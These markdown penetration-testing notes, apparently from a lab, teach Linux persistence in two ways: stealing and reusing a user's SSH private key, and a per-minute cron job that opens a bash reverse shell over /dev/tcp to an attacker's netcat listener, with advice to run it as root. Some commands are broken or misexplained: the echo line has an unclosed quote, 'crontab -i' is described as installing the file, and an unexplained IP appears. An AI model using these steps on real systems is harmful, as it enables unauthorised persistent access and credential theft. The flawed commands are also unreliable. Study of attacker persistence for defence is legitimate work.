# Linux Persistence

## Contents
- [Persistence Via SSH Keys](#persistence-via-ssh-keys)
  - [How SSH Works & How it Can Be Used for Persistence](#how-ssh-works--how-it-can-be-used-for-persistence)
  - [Generating SSH Keys](#generating-ssh-keys)
  - [Key Pair](#key-pair)
  - [Example](#example)
    - [Initial Access](#initial-access)
    - [Copy the id_rsa File](#copy-the-id_rsa-file)
    - [Persistence](#persistence)
- [Persistence Via Cron Jobs](#persistence-via-cron-jobs)
  - [Cron Jobs & Persistence](#cron-jobs--persistence)
  - [Anatomy of a Cron Job](#anatomy-of-a-cron-job)
  - [Example](#example-1)
    - [Initial Access](#initial-access-1)
    - [Check the Scheduled Cron Jobs](#check-the-scheduled-cron-jobs)
    - [Create a Cron Job](#create-a-cron-job)
    - [Add Cron Job to Crontab](#add-cron-job-to-crontab)
    - [Set Up a Listener](#set-up-a-listener)

## Persistence Via SSH Keys

### How SSH Works & How it Can Be Used for Persistence
- Linux is typically deployed as a server operating system and as a result Linux servers are typically accessed remotely via services (protocols) like SSH.
- If SSH is enabled and running on a Linux system that you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
- In most cases Linux servers will have key-based authentication enabled for the SSH service.
  - This allows the users to access the Linux system remotely without the need for a password.
- After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and then use that SSH private key for all future authentication and access.
  - **_The essential step in all of this is finding the private key on the target system_.**
- You could also generate a new public/private key pair, transfer the public key to the target Linux system, and use the private key to login. 

### Generating SSH Keys
```
ssh-keygen -t rsa -C "add any comment to label your key here"
```
- `-t rsa` : sets the type of algorithm to rsa
- `-C` : optional to add a short comment to "label" your key pair

### Key Pair
1. `id_rsa` : private key
2. `id_rsa.pub` : public key

### Example
> The following is from a lab. It shows the general process, commands, and techniques that can be replicated on other similar systems.

#### Initial Access
- We have gained access to a target Linux system via creds. Therefore we can login via ssh.
```
ssh compromised_username@[target ip]
```

#### Copy the id_rsa File
- We want to copy the `id_rsa` file from the compromised target account onto our attack system.
- Exit the target. Back in your attack machine, use the secure copy command: `scp`
  - scp copies files between hosts on a network.
  - It uses ssh for data transfer, and uses the same authentication and provides the same security as ssh.
```
# General Syntax:
[user]@[host1 or ip address]:/path/to/file-to-copy /path/to/local/copy-target
# Example: 
scp Syntax: scp compromised_username@[target ip]:~/.ssh/id_rsa .
```
- Once that copies to your local (attack) machine, you need to change the perms to what is expected of a private key
```
chmod 400 id_rsa      # this is required; ssh will pitch a fit if you don't
```
- Now you can use this private key to log into the target system via ssh.

#### Persistence
- Login with the ssh private key:
```
ssh -i id_rsa compromised_username@[target ip]
```
- `-i` : identity_file - Selects a file from which the identity (private key) for RSA or DSA authentication is read.
  - The default for ssh protocol version 1 is `~/.ssh/identity`
  - The default for ssh protocol version 2 is `~/.ssh/id_rsa` and `~/.ssh/id_dsa`
- That should log you onto the system without providing a password

----

## Persistence Via Cron Jobs

Reference: https://attack.mitre.org/techniques/T1053/

### Cron Jobs & Persistence
- Linux implements task scheduling through a utility called `cron`.
  - `cron` is a time-based service that runs applications, scripts, and other commands repeatedly on a specified schedule.
- An application (or script, etc.) that has been configured to run repeatedly with Cron is called a Cron Job.
  - After compromising a Linux systems...
  - We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.
  - You set up a Bash reverse shell command to run (and connect back to a Netcat listener) at certain intervals. That way, if you get kicked off or the machine reboots, etc. your cron job will "call home" and get you a reverse shell.

### Anatomy of a Cron Job
- The cron format has five time and date fields separated by at least one blank.
- An astersisk (`*`) in a field is the "wildcard" and indicates all legal values
- Therefore, five asterisks (`* * * * *`) means the cron job will run every minmute of every hour of every day of every month and every day of the week.
```
*  *  *  *  *    command to be executed
_  _  _  _  _
|  |  |  |  |
|  |  |  |  + -- day of the week  (0-7; Sunday is 0 and 7)
|  |  |  + ----- month            (1 - 12)
|  |  + -------- day of the month (1 - 31)
|  + ----------- hour             (0 - 23)
+ -------------- minute           (0 - 59)
```
### Example
> The following is from a lab. It shows the general process, commands, and techniques that can be replicated on other similar systems.

#### Initial Access
- We have gained access to a target Linux system via creds. Therefore we can login via ssh.
```
ssh compromised_username@[target ip]
```

#### Check the Scheduled Cron Jobs
- On the target machine:
```
cat /etc/cron*
```
#### Create a Cron Job
- You create a cron job by:
  - Creating your own cron file
  - Adding that cron file to the appropriate cron subdir
- Example:
```
echo "* * * * * /bin/bash -c 'bash -i &> /dev/tcp/[attack ip]/[port] 0>&1' > cron
cat cron  # to check
```
- `* * * * *` : run every minute of every hour of every day of every month of every week.
- Bash Stuff: 
  - `c string` : commands are read from string.
  - `>& (same as &>)` : redirect standard output (1) and standard error (2); i.e., 2>&1 
    - This means: `&>` redirects the standard output (fd 1) and error (fd 2) to the socket opened to the IP 192.166.95.2 which would be listening on port 1234 (the port you indicate in [port] ).
  - `0>&1` : redirect standard input (fd 0) to the same place as standard output (fd 1).
    - This would literally mean '0' (standard input) is attached to '1' (standard output).
    - Therefore, stdin (fd 0) is attached to stdout (fd 1) and (from the above:  &> ) we know that the stdin for this bash process is available to the attacker listening on port 1234.

#### Add Cron Job to Crontab
```
crontab -i cron
crontab -l
```
- `-i` : This option modifies the -r option to prompt the user for a 'y/Y' response before actually removing the crontab.
- `-r` : The current crontab will be removed.
- `-l` : -l : List the cronjobs in crontab (display the current crontab; i.e., table with scheduled cron jobs)
  - You should see your newly added reverse shell cron job.
- NOTE: This will be a cron job run with the perms of your current user account.
  -  This is not an elevated session.
  -  If you have elevated privileges, then use that account (i.e., root) to create your cron job. That way it executes with root's privileges.
 
#### Set Up a Listener
```
nc -nvlp 1234 
```
- Spin up a listener on your attack machine.
- You should get a connection within 1 minute.













